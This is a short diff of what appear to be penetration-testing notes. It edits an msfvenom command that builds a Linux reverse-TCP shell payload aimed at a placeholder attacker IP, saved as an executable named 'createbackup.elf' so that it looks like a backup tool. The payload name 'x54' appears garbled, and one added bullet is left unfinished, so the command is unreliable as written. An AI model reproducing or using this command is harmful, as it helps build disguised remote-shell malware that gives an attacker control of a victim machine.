@@ -33,5 +33,6 @@ msfvenom -f payloads
 
 ### Building it
 ```bash
-msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443
+msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createbackup.elf
 ```
+- `-f`
